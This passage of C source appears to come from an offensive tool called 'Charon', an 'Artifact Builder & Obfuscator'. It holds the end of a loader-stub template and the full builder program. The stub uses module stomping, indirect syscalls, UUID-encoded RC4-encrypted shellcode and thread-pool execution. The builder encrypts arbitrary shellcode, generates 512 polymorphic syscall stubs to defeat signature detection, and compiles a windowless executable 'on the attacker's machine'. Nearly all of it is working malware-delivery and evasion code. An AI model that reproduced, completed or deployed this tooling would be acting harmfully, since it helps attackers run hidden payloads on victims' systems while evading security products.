    "        char* sName = (char*)pSec[i].Name;\n"
    "        if (strncmp(sName, \".text\", 5) == 0) {\n"
    "            pAddr = (PVOID)((PBYTE)hSacrificial + pSec[i].VirtualAddress "
    "+ "
    "4096);\n"
    // Safety check: Ensure payload fits in the section
    "            if (sSize + 4096 > pSec[i].Misc.VirtualSize) { printf(\"[!] "
    "Payload "
    "too big for .text\\n\"); return 1; }\n"
    "            break;\n"
    "        }\n"
    "    }\n"
    "    if (!pAddr) { printf(\"[!] .text section not found in "
    "Sacrificial DLL\\n\"); return 1; }\n"
    "    printf(\"[+] Found target memory at %p (File-Backed)\\n\", pAddr);\n"
    "\n"
    // -------------------------------------------------------------------------
    // [STAGE 2] Preparation (RW)
    // Use Indirect Syscall (NtProtectVirtualMemory) to make the .text section
    // Writable.
    // -------------------------------------------------------------------------
    // Resolve Protect SSN index
    "    DWORD64 hProt = 0x858BCB1046FB6A37; \n"
    "    int idxProtect = -1;\n"
    "    for(int i=0; i<SyscallList.Count; i++) {\n"
    "        if(SyscallList.Entries[i].dwHash == hProt) idxProtect = i;\n"
    "    }\n"
    "    PBYTE pStubBase = (PBYTE)&Fnc0000;\n"
    "    fnNtProtectVirtualMemory fProt = (fnNtProtectVirtualMemory)(pStubBase "
    "+ (idxProtect * 16));\n"
    "    \n"
    "    printf(\"[+] Changing permissions to RW...\\n\");\n"
    "    NTSTATUS status = fProt(hProc, &pAddr, &sSize, PAGE_READWRITE, "
    "&dwOld);\n"
    "    if(status != 0) { printf(\"[!] Protect (RW) Failed: 0x%X\\n\", "
    "status); "
    "return 1; }\n"
    "\n"
    // -------------------------------------------------------------------------
    // [STAGE 3] Payload Decryption
    // Runtime calculation of the key (KeyGuard) and RC4 decryption.
    // -------------------------------------------------------------------------
    "    printf(\"[+] Decrypting payload into module...\\n\");\n"
    // KeyGuard: Brute-force the hint byte to derive the real key at runtime
    "    int b = 0; while(((Key[0]^b)-0) != HINT_BYTE) b++; \n"
    "    for(int i=0; i<KEY_SIZE; i++) Key[i] = (BYTE)((Key[i]^b)-i);\n"
    "    USTRING k = {KEY_SIZE, KEY_SIZE, Key}; USTRING d = {sSize, sSize, "
    "    pAddr};\n"
    "    fnSystemFunction032 Decrypt = "
    "(fnSystemFunction032)g_pSystemFunction032;\n"
    "    \n"
    "    // Load UUIDs from Resource\n"
    "    HRSRC hRes = FindResource(NULL, MAKEINTRESOURCE(101), RT_RCDATA);\n"
    "    if (!hRes) { printf(\"[!] Resource not found\\n\"); return 1; }\n"
    "    HGLOBAL hData = LoadResource(NULL, hRes);\n"
    "    if (!hData) { printf(\"[!] LoadResource failed\\n\"); return 1; }\n"
    "    char* pResData = (char*)LockResource(hData);\n"
    "    if (!pResData) { printf(\"[!] LockResource failed\\n\"); return 1; }\n"
    "    \n"
    "    // Decode UUIDs to pAddr\n"
    "    for (int i = 0; i < UUID_COUNT; i++) {\n"
    "        UUIDToBytes(pResData + (i * 36), (unsigned char*)pAddr + (i * "
    "16));\n"
    "    }\n"
    "    d.Buffer = pAddr;\n"
    "    Decrypt(&d, &k);\n"
    "\n"
    // -------------------------------------------------------------------------
    // [STAGE 4] Finalize (RX)
    // Restore permissions to Read+Execute.
    // -------------------------------------------------------------------------
    "    printf(\"[+] Changing permissions to RX...\\n\");\n"
    "    status = fProt(hProc, &pAddr, &sSize, PAGE_EXECUTE_READ, &dwOld);\n"
    "    if(status != 0) { printf(\"[!] Protect (RX) Failed: 0x%X\\n\", "
    "status); "
    "return 1; }\n"
    "\n"
    // -------------------------------------------------------------------------
    // [STAGE 5] Execution
    // Use Thread Pool APIs to execute the payload. This mimics legitimate work
    // items.
    // -------------------------------------------------------------------------
    "    printf(\"[+] Execution handed over to Thread Pool.\\n\");\n"
    "    char sNt[] = {'n','t','d','l','l','.','d','l','l',0};\n"
    "    HMODULE hNt = GetModuleHandleA(sNt);\n"
    "    fnTpAllocWork TpAlloc = (fnTpAllocWork)GetProcAddress(hNt, "
    "\"TpAllocWork\");\n"
    "    fnTpPostWork TpPost = (fnTpPostWork)GetProcAddress(hNt, "
    "\"TpPostWork\");\n"
    "    PVOID pWork = NULL;\n"
    "    TpAlloc(&pWork, pAddr, NULL, NULL);\n"
    "    TpPost(pWork);\n"
    "    ((fnTpWaitForWork)GetProcAddress(hNt, \"TpWaitForWork\"))(pWork, "
    "FALSE);\n"
    "    ((fnTpReleaseWork)GetProcAddress(hNt, \"TpReleaseWork\"))(pWork);\n"
    "\n"
    "    printf(\"[+] Finished. Press Enter to exit.\\n\");\n"
    // "    getchar();\n"
    "    return 0;\n"
    "}\n";

// =================================================================================
//  PART 3: BUILDER LOGIC
// =================================================================================
// The following code runs on the attacker's machine to build the artifact.

typedef struct _USTRING_BUILDER {
  DWORD Length;
  DWORD MaximumLength;
  PVOID Buffer;
} USTRING;
typedef NTSTATUS(NTAPI *fnSystemFunction032)(USTRING *Img, USTRING *Key);

// RC4_Encrypt: Encrypts data using SystemFunction032 (RtlEncryptMemory)
void RC4_Encrypt(unsigned char *key, DWORD keySize, unsigned char *data,
                 DWORD dataSize) {
  HMODULE hAdvapi = LoadLibraryA("Advapi32.dll");
  if (!hAdvapi)
    return;
  fnSystemFunction032 SystemFunction032 =
      (fnSystemFunction032)GetProcAddress(hAdvapi, "SystemFunction032");
  if (SystemFunction032) {
    USTRING uKey = {keySize, keySize, key};
    USTRING uData = {dataSize, dataSize, data};
    SystemFunction032(&uData, &uKey);
  }
  FreeLibrary(hAdvapi);
}

unsigned char *ReadFileBytes(const char *filename, DWORD *outSize) {
  FILE *f = fopen(filename, "rb");
  if (!f)
    return NULL;
  fseek(f, 0, SEEK_END);
  long size = ftell(f);
  rewind(f);
  unsigned char *buffer = (unsigned char *)malloc(size);
  if (buffer)
    fread(buffer, 1, size, f);
  fclose(f);
  *outSize = (DWORD)size;
  return buffer;
}

char *BytesToHexString(unsigned char *data, DWORD size) {
  char *hexStr = (char *)malloc(size * 6 + 10);
  if (!hexStr)
    return NULL;
  char *ptr = hexStr;
  for (DWORD i = 0; i < size; i++) {
    if (i < size - 1)
      ptr += sprintf(ptr, "0x%02X, ", data[i]);
    else
      ptr += sprintf(ptr, "0x%02X", data[i]);
  }
  return hexStr;
}

char *BytesToRawUUIDs(unsigned char *data, DWORD size) {
  // Estimate size: Each 16 bytes = 36 chars (no quotes, no commas, no newlines)
  // We will just concat them: UUIDUUIDUUID...
  DWORD estimatedSize = (size / 16 + 1) * 36 + 1;
  char *uuidBuf = (char *)malloc(estimatedSize);
  if (!uuidBuf)
    return NULL;

  char *ptr = uuidBuf;
  *ptr = '\0'; // Initialize string

  for (DWORD i = 0; i < size; i += 16) {
    unsigned char chunk[16] = {0};
    DWORD bytesToCopy = (size - i) >= 16 ? 16 : (size - i);
    memcpy(chunk, data + i, bytesToCopy);

    ptr += sprintf(ptr,
                   "%02X%02X%02X%02X-%02X%02X-%02X%02X-%02X%02X-%02X%02X%"
                   "02X%02X%02X%02X",
                   chunk[0], chunk[1], chunk[2], chunk[3], chunk[4], chunk[5],
                   chunk[6], chunk[7], chunk[8], chunk[9], chunk[10], chunk[11],
                   chunk[12], chunk[13], chunk[14], chunk[15]);
  }
  return uuidBuf;
}

char *ReplacePattern(const char *original, const char *pattern,
                     const char *replacement) {
  if (!original || !pattern || !replacement)
    return NULL;
  int newWlen = strlen(replacement);
  int oldWlen = strlen(pattern);
  int cnt = 0;
  const char *p = original;
  while ((p = strstr(p, pattern))) {
    cnt++;
    p += oldWlen;
  }

  size_t newSize = strlen(original) + cnt * (newWlen - oldWlen) + 1;
  char *result = (char *)malloc(newSize);
  if (!result)
    return NULL;

  char *dest = result;
  p = original;
  const char *found;
  while ((found = strstr(p, pattern))) {
    size_t len = found - p;
    memcpy(dest, p, len);
    dest += len;
    memcpy(dest, replacement, newWlen);
    dest += newWlen;
    p = found + oldWlen;
  }
  strcpy(dest, p);
  return result;
}

int main(int argc, char *argv[]) {
  printf("\n"
         "   _____ _    _          _____  ____  _   _ \n"
         "  / ____| |  | |   /\\   |  __ \\|  _ \\| \\ | |\n"
         " | |    | |__| |  /  \\  | |__) | | | |  \\| |\n"
         " | |    |  __  | / /\\ \\ |  _  /| | | | . ` |\n"
         " | |____| |  | |/ ____ \\| | \\ \\| |_| | |\\  |\n"
         "  \\_____|_|  |_/_/    \\_\\_|  \\_\\____/|_| \\_|\n"
         "        Artifact Builder & Obfuscator        \n"
         "\n");

  if (argc < 2) {
    printf("Usage: Charon.exe <shellcode_file>\n");
    return EXIT_FAILURE;
  }

  srand((unsigned int)time(NULL));
  const char *shellcodeFile = argv[1];

  // -----------------------------------------------------------------------
  // [BUILD STEP 1] Read Payload
  // Read the raw shellcode bytes from the provided file.
  // -----------------------------------------------------------------------
  DWORD shellcodeSize = 0;
  unsigned char *shellcode = ReadFileBytes(shellcodeFile, &shellcodeSize);
  if (!shellcode) {
    printf("[!] Failed to read file.\n");
    return EXIT_FAILURE;
  }

  // -----------------------------------------------------------------------
  // [BUILD STEP 2] Encrypt Payload
  // Use RC4 encryption with KeyGuard (obfuscated key derivation).
  // -----------------------------------------------------------------------
  printf("[*] Encrypting (RC4 + KeyGuard)...\n");
  unsigned char realKey[16], protectedKey[16];
  for (int i = 0; i < 16; i++)
    realKey[i] = rand() % 255;
  RC4_Encrypt(realKey, 16, shellcode, shellcodeSize);

  // KeyGuard Logic: Obfuscate the key so it's not present in plaintext strings
  unsigned char b = (rand() % 200) + 1;
  for (int i = 0; i < 16; i++)
    protectedKey[i] = (unsigned char)((realKey[i] + i) ^ b);
  unsigned char hintByte = protectedKey[0] ^ b;

  char *sPayload = BytesToRawUUIDs(shellcode, shellcodeSize);
  char *sKey = BytesToHexString(protectedKey, 16);
  char sHint[10];
  sprintf(sHint, "0x%02X", hintByte);

  char sCount[16];
  sprintf(sCount, "%lu", (shellcodeSize + 15) / 16);

  // -----------------------------------------------------------------------
  // [BUILD STEP 3] Generate Assembly Stubs (Polymorphic)
  // Create 'syscalls.asm' with the evasion engine and 512 unique entry stubs.
  // -----------------------------------------------------------------------
  printf("[*] Generating syscalls.asm (HellHall + 512 Polymorphic Stubs)...\n");
  FILE *fAsm = fopen("syscalls.asm", "w");
  if (fAsm) {
    fputs(g_HellHallAsm, fAsm);
    // Target 512 stubs (covers all NTDLL)
    int STUB_COUNT = 512;

    for (int i = 0; i < STUB_COUNT; i++) {
      fprintf(fAsm, "    PUBLIC Fnc%04X\n", i);
      fprintf(fAsm, "    ALIGN 16\n"); // Align to 16 bytes
      fprintf(fAsm, "    Fnc%04X PROC\n", i);

      // Standard instruction
      fprintf(fAsm, "        mov eax, %d\n", i);
      fprintf(fAsm, "        jmp SyscallExec\n");

      // Random Junk / NOPs to fill remaining 6 bytes (16 - 10 = 6)
      // This breaks the block hash signature
      int padding = rand() % 3; // Choose random pattern
      if (padding == 0) {
        // 6 NOPs
        fprintf(fAsm, "        nop\n        nop\n        nop\n        nop\n    "
                      "    nop\n        nop\n");
      } else if (padding == 1) {
        // 3 byte (xchg r8,r8) + 3 byte (nop, nop, nop) = 6
        fprintf(fAsm,
                "        xchg r8, r8\n        nop\n        nop\n        nop\n");
      } else {
        // 2 byte (xchg ax,ax) + 2 byte (xchg ax,ax) + 2 byte (nop,nop) = 6
        fprintf(fAsm, "        xchg ax, ax\n        xchg ax, ax\n        nop\n "
                      "       nop\n");
      }

      fprintf(fAsm, "    Fnc%04X ENDP\n\n", i);
    }
    fprintf(fAsm, "end\n");
    fclose(fAsm);
  }

  // -----------------------------------------------------------------------
  // [BUILD STEP 4] Assemble & Compile
  // Invoke ML64 and CL to build the final artifact.
  // -----------------------------------------------------------------------
  printf("[*] Assembling (ML64)...\n");
  if (system("ml64 /c /Cx /nologo syscalls.asm") != 0) {
    printf("[!] Assembly Failed.\n");
    return EXIT_FAILURE;
  }

  // -----------------------------------------------------------------------
  // [BUILD STEP 5] Generate C Source & Resource
  // Replace placeholders and write payload.bin / resource.rc
  // -----------------------------------------------------------------------
  printf("[*] Generating artifact.c and resources...\n");
  char *step1 = ReplacePattern(g_StubTemplate, "{{HINT_BYTE}}", sHint);
  char *step2 = ReplacePattern(step1, "{{UUID_COUNT}}", sCount);
  char *finalSource = ReplacePattern(step2, "{{KEY_BYTES}}", sKey);

  FILE *fC = fopen("artifact.c", "w");
  if (fC) {
    fputs(finalSource, fC);
    fclose(fC);
  }

  // Write payload.bin
  FILE *fBin = fopen("payload.bin", "wb");
  if (fBin) {
    fwrite(sPayload, 1, strlen(sPayload), fBin);
    fclose(fBin);
  }

  // Write resource.rc
  FILE *fRc = fopen("resource.rc", "w");
  if (fRc) {
    fprintf(fRc, "101 RCDATA \"payload.bin\"\n");
    fclose(fRc);
  }

  // Compile Resource
  printf("[*] Compiling Resource (RC)...\n");
  if (system("rc /nologo resource.rc") != 0) {
    printf("[!] Resource Compilation Failed.\n");
    return EXIT_FAILURE;
  }

  // -----------------------------------------------------------------------
  // [BUILD STEP 6] Compile
  // Compile the artifact C code and link it with the assembly object and
  // resource.
  // -----------------------------------------------------------------------
  printf("[*] Compiling Artifact (CL)...\n");
  // Uncomment to enable console mode
  // int res = system("cl /nologo /O2 artifact.c syscalls.obj resource.res"
  //                 "/Fe:CharonArtifact.exe /link /CETCOMPAT:NO");

  int res =
      system("cl /nologo /O2 artifact.c syscalls.obj resource.res "
             // "sqlite-amalgamation-3510200\\sqlite3.c "
             "/Fe:CharonArtifact.exe /link /CETCOMPAT:NO /SUBSYSTEM:WINDOWS");

  // -----------------------------------------------------------------------
  // [BUILD STEP 7] Cleanup
  // Remove temporary build files.
  // -----------------------------------------------------------------------
  system("del syscalls.asm syscalls.obj artifact.c artifact.obj payload.bin "
         "resource.rc resource.res >NUL 2>&1");
  free(step1);
  free(step2);
  free(finalSource);
  free(sPayload);
  free(sKey);
  free(shellcode);

  if (res == 0) {
    printf("\n[+] SUCCESS: CharonArtifact.exe created.\n");
    return EXIT_SUCCESS;
  } else {
    printf("\n[!] FAILURE: Compilation error.\n");
    return EXIT_FAILURE;
  }
}
